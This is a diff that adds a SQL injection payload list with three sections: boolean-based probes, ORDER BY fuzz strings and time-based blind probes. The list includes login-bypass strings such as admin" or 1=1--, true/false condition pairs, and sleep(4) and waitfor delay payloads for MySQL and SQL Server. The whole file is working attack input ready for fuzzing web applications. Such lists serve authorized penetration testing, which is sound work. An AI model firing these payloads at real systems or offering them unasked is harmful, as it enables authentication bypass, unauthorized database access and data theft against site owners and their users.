@@ -1,0 +1,105 @@
+------------ BOOL SQLINJECTION ------------
+\
+'
+"
+%df'
+%df"
+and 1=1
+and 1=2
+' and '1'='1
+' and '1'='2
+" and "1"="1
+" and "1"="2
+) and (1=1
+) and (1=2
+') and ('1'='1
+') and ('1'='2
+%' and 1=1 and '%'='
+%' and 1=2 and '%'='x
+%') and 1=1 and ('%'='
+%') and 1=2 and ('%'='x
+OR 1=1
+OR 1=2
+' OR 1=1-- -
+' OR 1=2-- -
+) OR 1=1-- -
+) OR 1=2-- -
+') OR 1=1-- -
+') OR 1=2-- -
+" OR "1"="1
+" OR "1"="2
+' OR '1'='1
+' OR '1'='2
+) OR (1=1
+) OR (1=2
+') OR ('1'='1
+') OR ('1'='2
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+
+--------------------- ORDER BY SQLINJECTION fuzz payload -----------------------
+(case when(1=1) then 1 else (select 1 union select 2) end)
+(case when(1=2) then 1 else (select 1 union select 2) end)
+,(1-(case when(1=1) then 1 else (select 1 union select 2) end))
+,(1-(case when(1=2) then 1 else (select 1 union select 2) end))
+,1=if((1=1),1,(select 1 union select 2))
+,1=if((1=2),1,(select 1 union select 2))
+,If((1=1),1,(select 1 union select 2))-- -
+,If((1=2),1,(select 1 union select 2))-- -
+,If((1=1),sleep(4),(select 1 union select 2))-- -
+-IF((1=1),1,(SELECT 1 UNION SELECT 2))-- -
+-IF((1=2),1,(SELECT 1 UNION SELECT 2))-- -
+-(case when(1=1) then 1 else (select 1 union select 2) end)
+-(case when(1=2) then 1 else (select 1 union select 2) end)
+
+------------------------- TIME-BASE SQLINJECTION ------------------------
+'%2b(if((1=1 and sleep(4)),1,(select 1 union select 2)))%2b'a
+-IF((1=1),sleep(4),(SELECT 1 UNION SELECT 2))-- -
+';(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -
+;SELECT sleep(4)
+);SELECT sleep(4)-- -
+;SELECT sleep(4)-- -
+;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -
+' AND SLEEP(4)%23
+AND sleep(4)
+' AND sleep(4) AND '1'='1
+') AND sleep(4) AND ('1'='1
+) AND sleep(4) AND (1=1
+" AND sleep(4) AND "1"="
+') and (select(0)from(select(sleep(4)))x)-- -
+and (select(0)from(select(sleep(4)))x)
+and (select(0)from(select(sleep(4)))x) and 1=1
+' and (select(0)from(select(sleep(4)))x) and '1'='1
+" and (select(0)from(select(sleep(4)))x) and "1"="1
+) and (select(0)from(select(sleep(4)))x) and (1=1
+') and (select(0)from(select(sleep(4)))x) and ('1'='1
+rlike (select(0)from(select(sleep(4)))x) and 1=1
+' rlike (select(0)from(select(sleep(4)))x) and '1'='1
+) rlike (select(0)from(select(sleep(4)))x) and (1=1
+') rlike (select(0)from(select(sleep(4)))x) and ('1'='1
+;waitfor delay '0:0:4' -- -
+';waitfor delay '0:0:4' -- -
+);waitfor delay '0:0:4' -- -
+');waitfor delay '0:0:4' -- -
+if(now()=sysdate(),sleep(4),0)/*'XOR(if(now()=sysdate(),sleep(4),0))OR'"XOR(if(now()=sysdate(),sleep(4),0))OR"*/
+(SELECT * FROM(SELECT(sleep(4)))lWuP)
+
+
